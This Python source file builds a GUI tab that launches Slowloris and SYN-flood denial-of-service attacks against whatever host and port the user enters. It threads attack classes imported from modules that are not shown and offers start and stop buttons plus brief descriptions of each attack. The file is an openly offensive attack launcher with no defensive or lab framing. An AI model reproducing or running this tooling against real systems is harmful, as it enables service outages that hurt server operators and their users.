# ddos_attack.py
import tkinter as tk
from tkinter import ttk
import customtkinter as ctk
import threading
from slowloris import SlowlorisAttack
from syn_flood import SynFloodAttack

def start_ddos_attack(target_entry, port_entry, attack_type_var, output_text_box, stop_event, attack_threads):
    target_host = target_entry.get()
    target_port = int(port_entry.get())
    selected_attack = attack_type_var.get()

    if selected_attack == "Slowloris":
        threading.Thread(target=SlowlorisAttack(output_text_box, stop_event, attack_threads).slowloris_attack, args=(target_host, target_port)).start()
    elif selected_attack == "SYN Flood":
        syn_flood = SynFloodAttack(output_text_box, stop_event, attack_threads)
        attack_threads.append(syn_flood)
        threading.Thread(target=syn_flood.start_attack, args=(target_host, target_port)).start()

def stop_ddos_attack(output_text_box, stop_event, attack_threads):
    stop_event.set()
    output_text_box.insert(tk.END, "Please wait while stopping the attack...\n")
    for attack in attack_threads:
        attack.stop_attack()
    output_text_box.insert(tk.END, "Attack stopped!\n")

def setup_ddos_attack_tab(notebook):
    ddos_attack_tab = ttk.Frame(notebook)
    notebook.add(ddos_attack_tab, text="DDOS Attack")

    ddos_target_label = ctk.CTkLabel(master=ddos_attack_tab, text="Target Address:")
    ddos_target_label.pack(pady=10)

    ddos_target_entry = ctk.CTkEntry(master=ddos_attack_tab, width=200)
    ddos_target_entry.pack(pady=5)

    ddos_port_label = ctk.CTkLabel(master=ddos_attack_tab, text="Target Port:")
    ddos_port_label.pack(pady=10)

    ddos_port_entry = ctk.CTkEntry(master=ddos_attack_tab, width=200)
    ddos_port_entry.pack(pady=5)
    ddos_port_entry.insert(0, "80")

    attack_type_var = tk.StringVar(value="Slowloris")

    slowloris_radio_button = ctk.CTkRadioButton(master=ddos_attack_tab, text="Slowloris Attack", variable=attack_type_var, value="Slowloris")
    slowloris_radio_button.pack(pady=5)

    syn_flood_radio_button = ctk.CTkRadioButton(master=ddos_attack_tab, text="SYN Flood Attack", variable=attack_type_var, value="SYN Flood")
    syn_flood_radio_button.pack(pady=5)

    stop_event = threading.Event()
    attack_threads = []

    start_ddos_attack_button = ctk.CTkButton(master=ddos_attack_tab, text="Start Attack", command=lambda: start_ddos_attack(ddos_target_entry, ddos_port_entry, attack_type_var, ddos_output_text_box, stop_event, attack_threads))
    start_ddos_attack_button.pack(pady=10)

    stop_ddos_attack_button = ctk.CTkButton(master=ddos_attack_tab, text="Stop Attack", command=lambda: stop_ddos_attack(ddos_output_text_box, stop_event, attack_threads))
    stop_ddos_attack_button.pack(pady=10)

    ddos_output_frame = ctk.CTkFrame(master=ddos_attack_tab)
    ddos_output_frame.pack(expand=True, fill="both", padx=10, pady=10)

    global ddos_output_text_box
    ddos_output_text_box = ctk.CTkTextbox(master=ddos_output_frame, height=20, width=600)
    ddos_output_text_box.pack(side="left", fill="both", expand=True)

    ddos_scrollbar = ttk.Scrollbar(master=ddos_output_frame, orient="vertical", command=ddos_output_text_box.yview)
    ddos_scrollbar.pack(side="right", fill="y")
    ddos_output_text_box.configure(yscrollcommand=ddos_scrollbar.set)

    ddos_output_text_box.insert(tk.END, "Slowloris Attack: A type of Denial-of-Service (DoS) attack that sends partial HTTP requests to keep many connections to the target web server open and hold them open as long as possible.\n\n")
    ddos_output_text_box.insert(tk.END, "SYN Flood Attack: A type of Denial-of-Service (DoS) attack that exploits the TCP handshake process by sending many SYN packets to a target server, overwhelming its resources.\n\n")
